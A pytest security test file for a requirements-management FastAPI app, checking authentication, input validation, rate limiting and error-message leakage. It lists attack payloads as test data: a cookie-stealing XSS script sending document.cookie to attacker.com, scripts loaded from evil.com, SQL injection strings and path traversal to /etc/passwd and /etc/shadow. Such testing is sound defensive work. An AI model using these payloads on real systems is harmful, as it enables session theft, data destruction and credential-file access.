# tests/security/test_phase7_requirements_security.py
"""
Security tests for Phase 7 Requirements Management System
Tests against common security vulnerabilities and attack vectors
"""

import json
import pytest
import time
from fastapi.testclient import TestClient

from app_requirements import app


class TestAuthenticationSecurity:
    """Test authentication and authorization security"""
    
    def setup_method(self):
        """Set up test environment"""
        self.client = TestClient(app)
    
    def test_admin_endpoints_require_authentication(self):
        """Test that admin-only endpoints require authentication"""
        admin_endpoints = [
            ("/api/requirements/submit", "POST", {"title": "Test", "version": "1.0.0", "description": "Test", "requirements": {"functional": [], "non_functional": []}, "author": "test"}),
            ("/api/audit/integrity", "GET", None),
            ("/api/validation/report", "GET", None)
        ]
        
        for endpoint, method, data in admin_endpoints:
            if method == "POST":
                response = self.client.post(endpoint, json=data)
            else:
                response = self.client.get(endpoint)
            
            assert response.status_code == 401, f"Endpoint {endpoint} should require authentication"
            assert "authentication required" in response.json()["detail"].lower()
    
    def test_feature_approval_requires_admin(self):
        """Test that feature approval requires admin privileges"""
        # First submit a feature (no auth required)
        feature_data = {
            "title": "Security Test Feature",
            "description": "Testing admin-only approval functionality",
            "priority": "medium",
            "requester": "test_user"
        }
        
        submit_response = self.client.post("/api/features/submit", json=feature_data)
        assert submit_response.status_code == 200
        request_id = submit_response.json()["request_id"]
        
        # Try to approve without admin header
        approval_data = {
            "action": "approve",
            "admin": "fake_admin",
            "reason": "Attempting unauthorized approval"
        }
        
        response = self.client.post(f"/api/features/{request_id}/approve", json=approval_data)
        
        assert response.status_code == 401
        assert "authentication required" in response.json()["detail"].lower()
        
        # Verify feature status hasn't changed
        feature_check = self.client.get(f"/api/features/{request_id}")
        assert feature_check.json()["status"] == "pending"
    
    def test_invalid_admin_header_rejected(self):
        """Test that invalid admin headers are handled properly"""
        requirements_data = {
            "title": "Security Test Requirements",
            "version": "1.0.0",
            "description": "Testing invalid admin header",
            "requirements": {"functional": [], "non_functional": []},
            "author": "test"
        }
        
        # Try with empty admin header
        response = self.client.post(
            "/api/requirements/submit",
            json=requirements_data,
            headers={"X-Admin-User": ""}
        )
        
        assert response.status_code == 401
        
        # Try with very long admin header (potential buffer overflow attempt)
        long_admin = "a" * 10000
        response = self.client.post(
            "/api/requirements/submit",
            json=requirements_data,
            headers={"X-Admin-User": long_admin}
        )
        
        # Should either reject or truncate safely
        assert response.status_code in [400, 401, 422]


class TestInputValidationSecurity:
    """Test input validation against malicious payloads"""
    
    def setup_method(self):
        """Set up test environment"""
        self.client = TestClient(app)
    
    def test_xss_prevention_in_requirements(self):
        """Test XSS prevention in requirements submission"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "eval('malicious code')",
            "document.cookie",
            "window.location='http://evil.com'",
            "<iframe src='javascript:alert(1)'></iframe>"
        ]
        
        for payload in xss_payloads:
            malicious_requirements = {
                "title": f"XSS Test {payload}",
                "version": "1.0.0",
                "description": f"Description with {payload}",
                "requirements": {
                    "functional": [
                        {
                            "id": "FR-001",
                            "title": f"Requirement with {payload}",
                            "description": payload,
                            "priority": "high"
                        }
                    ],
                    "non_functional": []
                },
                "author": f"author_{payload}"
            }
            
            response = self.client.post(
                "/api/requirements/submit",
                json=malicious_requirements,
                headers={"X-Admin-User": "admin"}
            )
            
            # Should be rejected due to dangerous content
            assert response.status_code == 400
            assert "dangerous content detected" in response.json()["detail"]
    
    def test_xss_prevention_in_feature_requests(self):
        """Test XSS prevention in feature requests"""
        xss_payload = "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"
        
        malicious_feature = {
            "title": f"Feature with {xss_payload}",
            "description": f"This feature contains malicious content: {xss_payload}",
            "priority": "medium",
            "requester": f"hacker_{xss_payload}"
        }
        
        response = self.client.post("/api/features/submit", json=malicious_feature)
        
        assert response.status_code == 400
        assert "dangerous content detected" in response.json()["detail"]
    
    def test_sql_injection_prevention(self):
        """Test SQL injection prevention in string fields"""
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO admin (user) VALUES ('hacker'); --",
            "UNION SELECT password FROM users WHERE '1'='1",
            "'; UPDATE users SET role='admin' WHERE user='hacker'; --"
        ]
        
        for payload in sql_payloads:
            feature_data = {
                "title": f"SQL Test {payload}",
                "description": f"Description with {payload}",
                "priority": "medium",
                "requester": f"user{payload}"
            }
            
            response = self.client.post("/api/features/submit", json=feature_data)
            
            # Should be rejected or sanitized
            # Since we're using JSON and parameterized queries, SQL injection should be prevented
            # But our XSS filter might catch some of these patterns too
            assert response.status_code in [200, 400]
            
            if response.status_code == 200:
                # If accepted, verify the data was sanitized
                request_id = response.json()["request_id"]
                feature_check = self.client.get(f"/api/features/{request_id}")
                
                # Verify dangerous SQL characters were escaped/sanitized
                title = feature_check.json()["title"]
                description = feature_check.json()["description"]
                
                # Should not contain raw SQL injection strings
                assert "DROP TABLE" not in title.upper()
                assert "DROP TABLE" not in description.upper()
    
    def test_path_traversal_prevention(self):
        """Test path traversal attack prevention"""
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",  # URL encoded
            "....//....//....//etc/passwd",
            "/var/log/../../etc/shadow"
        ]
        
        for payload in path_payloads:
            feature_data = {
                "title": f"Path test {payload}",
                "description": f"Testing path traversal with {payload}",
                "priority": "medium",
                "requester": "security_tester"
            }
            
            response = self.client.post("/api/features/submit", json=feature_data)
            
            # Should be accepted (path traversal mainly affects file operations)
            # But verify no actual file access is attempted
            assert response.status_code in [200, 400]
    
    def test_json_structure_attacks(self):
        """Test against JSON structure manipulation attacks"""
        # Test deeply nested JSON (JSON bomb)
        deep_json = {"level": 1}
        current = deep_json
        for i in range(2, 1000):  # Create deeply nested structure
            current["nested"] = {"level": i}
            current = current["nested"]
        
        malicious_requirements = {
            "title": "Deep JSON Test",
            "version": "1.0.0",
            "description": "Testing deeply nested JSON",
            "requirements": {
                "functional": [deep_json],
                "non_functional": []
            },
            "author": "json_bomber"
        }
        
        response = self.client.post(
            "/api/requirements/submit",
            json=malicious_requirements,
            headers={"X-Admin-User": "admin"}
        )
        
        # Should handle gracefully without crashing
        assert response.status_code in [200, 400, 413, 422]  # Various possible responses
    
    def test_oversized_payload_protection(self):
        """Test protection against oversized payloads"""
        # Create very large strings
        huge_string = "A" * 1000000  # 1MB string
        
        oversized_requirements = {
            "title": huge_string,
            "version": "1.0.0", 
            "description": huge_string,
            "requirements": {
                "functional": [
                    {
                        "id": "FR-001",
                        "title": huge_string,
                        "description": huge_string,
                        "priority": "high"
                    }
                ],
                "non_functional": []
            },
            "author": "payload_bomber"
        }
        
        response = self.client.post(
            "/api/requirements/submit",
            json=oversized_requirements,
            headers={"X-Admin-User": "admin"}
        )
        
        # Should reject oversized payloads
        assert response.status_code in [400, 413, 422]  # Bad request, payload too large, or validation error
    
    def test_unicode_and_encoding_attacks(self):
        """Test against unicode and encoding-based attacks"""
        unicode_payloads = [
            "\u202e<script>alert('xss')</script>",  # Right-to-left override
            "𝒶𝓁𝑒𝓇𝓉('𝓍𝓈𝓈')",  # Mathematical script
            "ℬ℧ↅ℅ℇ℉ℋℎ",  # Special unicode characters
            "\x00\x01\x02\x03\x04",  # Null bytes and control characters
            "café\u0000\u0001\u0002",  # Mixed normal and control characters
        ]
        
        for payload in unicode_payloads:
            feature_data = {
                "title": f"Unicode test {payload}",
                "description": f"Testing unicode handling: {payload}",
                "priority": "medium",
                "requester": f"unicode_tester_{len(payload)}"
            }
            
            response = self.client.post("/api/features/submit", json=feature_data)
            
            # Should handle unicode gracefully
            assert response.status_code in [200, 400]
            
            if response.status_code == 200:
                # Verify unicode was handled safely
                request_id = response.json()["request_id"]
                feature_check = self.client.get(f"/api/features/{request_id}")
                
                # Should not crash and should return valid JSON
                assert feature_check.status_code == 200
                feature_data = feature_check.json()
                assert "title" in feature_data


class TestRateLimitingSecurity:
    """Test rate limiting and abuse prevention"""
    
    def setup_method(self):
        """Set up test environment"""
        self.client = TestClient(app)
    
    def test_feature_submission_rate_limiting(self):
        """Test that feature submissions can be rate limited"""
        feature_template = {
            "title": "Rate limit test feature {i}",
            "description": "Testing rate limiting functionality",
            "priority": "low",
            "requester": "rate_tester"
        }
        
        successful_requests = 0
        rate_limited_requests = 0
        
        # Submit many requests quickly
        for i in range(50):
            feature_data = {
                "title": f"Rate limit test feature {i}",
                "description": f"Testing rate limiting functionality #{i}",
                "priority": "low",
                "requester": "rate_tester"
            }
            
            response = self.client.post("/api/features/submit", json=feature_data)
            
            if response.status_code == 200:
                successful_requests += 1
            elif response.status_code == 429:  # Too Many Requests
                rate_limited_requests += 1
            
            # Small delay to avoid overwhelming the test
            time.sleep(0.01)
        
        # In a production system, we'd expect some rate limiting
        # For testing, we at least verify the system doesn't crash
        assert successful_requests > 0
        print(f"Successful: {successful_requests}, Rate limited: {rate_limited_requests}")
    
    def test_schema_validation_dos_protection(self):
        """Test protection against DoS via expensive schema validation"""
        # Create complex schema validation request
        complex_data = {
            "title": "Complex validation test",
            "version": "1.0.0",
            "description": "Testing expensive validation operations",
            "requirements": {
                "functional": [
                    {
                        "id": f"FR-{i:04d}",
                        "title": f"Requirement {i}" * 100,  # Long titles
                        "description": f"Very long description for requirement {i} " * 50,
                        "priority": "medium",
                        "category": "functionality",
                        "acceptance_criteria": [f"Criteria {j}" for j in range(20)],
                        "dependencies": [f"FR-{k:04d}" for k in range(max(0, i-5), i)],
                        "risk_level": "medium",
                        "estimate_hours": 40
                    }
                    for i in range(100)
                ],
                "non_functional": []
            },
            "metadata": {
                "version_id": 123456,
                "author": "dos_tester",
                "timestamp": "2024-01-01T00:00:00Z"
            }
        }
        
        validation_request = {
            "schema_type": "requirements",
            "data": complex_data
        }
        
        start_time = time.perf_counter()
        response = self.client.post("/api/validate/schema", json=validation_request)
        end_time = time.perf_counter()
        
        response_time = (end_time - start_time) * 1000
        
        # Should complete within reasonable time even for complex data
        assert response_time < 10000, f"Validation took {response_time:.2f}ms - potential DoS vulnerability"
        assert response.status_code in [200, 400, 422]  # Various acceptable responses


class TestDataLeakageSecurity:
    """Test against information disclosure vulnerabilities"""
    
    def setup_method(self):
        """Set up test environment"""
        self.client = TestClient(app)
    
    def test_error_messages_dont_leak_info(self):
        """Test that error messages don't leak sensitive information"""
        # Test with invalid version ID
        response = self.client.get("/api/requirements/99999999")
        
        assert response.status_code == 404
        error_detail = response.json()["detail"]
        
        # Should not leak database structure, file paths, etc.
        sensitive_patterns = [
            "database",
            "table", 
            "column",
            "/tmp/",
            "/var/",
            "C:\\",
            "SELECT",
            "INSERT",
            "UPDATE",
            "DELETE",
            "python",
            "traceback",
            "exception"
        ]
        
        error_lower = error_detail.lower()
        for pattern in sensitive_patterns:
            assert pattern not in error_lower, f"Error message leaks sensitive info: {pattern}"
    
    def test_audit_trail_privacy(self):
        """Test that audit trail doesn't expose sensitive data"""
        # Submit feature with potentially sensitive info
        feature_data = {
            "title": "Feature with sensitive data",
            "description": "This contains email: admin@company.com and password: secret123",
            "priority": "medium",
            "requester": "privacy_tester"
        }
        
        # This should be rejected due to XSS filter, but test audit trail if it passes
        response = self.client.post("/api/features/submit", json=feature_data)
        
        if response.status_code == 200:
            request_id = response.json()["request_id"]
            
            # Approve to create audit entry
            approval_data = {
                "action": "approve",
                "admin": "admin@company.internal",
                "reason": "Approved despite containing sensitive data"
            }
            
            self.client.post(
                f"/api/features/{request_id}/approve",
                json=approval_data,
                headers={"X-Admin-User": "admin"}
            )
            
            # Check audit trail doesn't leak sensitive data
            audit_response = self.client.get(f"/api/audit/features?request_id={request_id}")
            audit_data = audit_response.json()
            
            audit_str = json.dumps(audit_data)
            
            # Should not contain sensitive patterns in audit
            sensitive_patterns = ["password:", "secret", "key=", "token="]
            for pattern in sensitive_patterns:
                assert pattern not in audit_str.lower(), f"Audit trail contains sensitive pattern: {pattern}"
    
    def test_schema_information_disclosure(self):
        """Test that schema endpoints don't leak sensitive information"""
        response = self.client.get("/api/schemas")
        
        assert response.status_code == 200
        schemas_data = response.json()
        
        schemas_str = json.dumps(schemas_data)
        
        # Should not contain sensitive file paths or internal details
        sensitive_patterns = [
            "/tmp/",
            "/var/",
            "C:\\Users\\",
            "password",
            "secret",
            "private",
            "internal"
        ]
        
        for pattern in sensitive_patterns:
            assert pattern not in schemas_str, f"Schema response contains sensitive info: {pattern}"


class TestInputSanitization:
    """Test comprehensive input sanitization"""
    
    def setup_method(self):
        """Set up test environment"""
        self.client = TestClient(app)
    
    def test_html_sanitization(self):
        """Test that HTML is properly sanitized"""
        html_payloads = [
            "<b>bold text</b>",
            "<i>italic text</i>",
            "<u>underlined</u>",
            "<div>content</div>",
            "<p>paragraph</p>",
            "<h1>header</h1>",
            "<table><tr><td>cell</td></tr></table>"
        ]
        
        for payload in html_payloads:
            feature_data = {
                "title": f"HTML test {payload}",
                "description": f"Testing HTML sanitization: {payload}",
                "priority": "medium",
                "requester": "html_tester"
            }
            
            response = self.client.post("/api/features/submit", json=feature_data)
            
            if response.status_code == 200:
                request_id = response.json()["request_id"]
                feature_check = self.client.get(f"/api/features/{request_id}")
                
                title = feature_check.json()["title"]
                description = feature_check.json()["description"]
                
                # HTML should be escaped/sanitized
                assert "&lt;" in title or "&gt;" in title or "<" not in title
                assert "&lt;" in description or "&gt;" in description or "<" not in description
    
    def test_script_tag_variants(self):
        """Test various script tag bypass attempts"""
        script_variants = [
            "<SCRIPT>alert('xss')</SCRIPT>",
            "<script>alert('xss')</script>",
            "<ScRiPt>alert('xss')</ScRiPt>",
            "<script src='http://evil.com/xss.js'></script>",
            "<script language='javascript'>alert('xss')</script>",
            "<<script>alert('xss');//<</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>"
        ]
        
        for variant in script_variants:
            feature_data = {
                "title": f"Script variant test",
                "description": f"Testing script sanitization: {variant}",
                "priority": "medium",
                "requester": "script_tester"
            }
            
            response = self.client.post("/api/features/submit", json=feature_data)
            
            # Should be rejected due to dangerous content detection
            assert response.status_code == 400
            assert "dangerous content detected" in response.json()["detail"]


if __name__ == "__main__":
    pytest.main([__file__, "-v"])